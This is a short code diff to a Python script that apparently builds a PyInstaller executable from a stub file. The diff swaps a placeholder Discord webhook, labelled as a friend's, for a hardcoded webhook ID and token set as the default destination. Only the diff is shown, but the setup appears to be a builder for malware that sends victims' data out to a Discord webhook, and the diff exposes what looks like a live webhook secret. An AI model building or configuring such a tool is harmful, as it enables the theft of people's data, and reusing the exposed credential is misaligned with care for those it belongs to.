@@ -36,10 +36,7 @@ STUB_SRC = ROOT / "stub.py"
 BUILD = ROOT / "build"
 MAGIC = stub.MAGIC
 
-DEFAULT_WEBHOOK = ("https://discord.com/api/webhooks/"
-                   "FRIEND_WEBHOOK_ID/FRIEND_WEBHOOK_TOKEN")
-
-
+DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1573998939772948590/FcLZKOGLChs6uoNuY3d9JWJYpxZWU-wvPivzsIw7Ga7VrmsYqXb0D0HriL37tA3NDVHl"
 def ensure_pyinstaller() -> None:
     """Fail with the exact command instead of a bare ModuleNotFoundError."""
     try:
